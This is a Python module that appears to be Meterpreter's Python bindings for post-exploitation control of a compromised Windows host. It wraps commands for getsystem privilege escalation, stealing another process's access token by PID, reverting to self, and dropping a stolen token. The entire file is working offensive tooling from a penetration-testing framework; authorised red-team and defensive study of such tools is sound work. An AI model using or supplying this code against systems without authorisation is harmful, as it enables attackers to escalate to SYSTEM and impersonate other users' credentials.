import meterpreter_bindings

from meterpreter.core import *
from meterpreter.tlv import *
from meterpreter.command import *

# We only support technique 1 (as it's the only one that doesn't require DLLs)
def getsystem():
  tlv = tlv_pack(TLV_TYPE_ELEVATE_TECHNIQUE, 1)
  tlv += tlv_pack(TLV_TYPE_ELEVATE_SERVICE_NAME, rnd_string(5))
  resp = invoke_meterpreter(COMMAND_ID_PRIV_ELEVATE_GETSYSTEM, True, tlv)
  if resp == None:
    return False

  return packet_get_tlv(resp, TLV_TYPE_RESULT)['value'] == 0

def rev2self():
  resp = invoke_meterpreter(COMMAND_ID_STDAPI_SYS_CONFIG_REV2SELF, True)
  if resp == None:
    return False

  return packet_get_tlv(resp, TLV_TYPE_RESULT)['value'] == 0

def steal_token(pid):
  tlv = tlv_pack(TLV_TYPE_PID, pid)
  resp = invoke_meterpreter(COMMAND_ID_STDAPI_SYS_CONFIG_STEAL_TOKEN, True, tlv)
  if resp == None:
    return False

  return packet_get_tlv(resp, TLV_TYPE_RESULT)['value'] == 0

def drop_token():
  resp = invoke_meterpreter(COMMAND_ID_STDAPI_SYS_CONFIG_DROP_TOKEN, True)
  if resp == None:
    return False

  return packet_get_tlv(resp, TLV_TYPE_RESULT)['value'] == 0

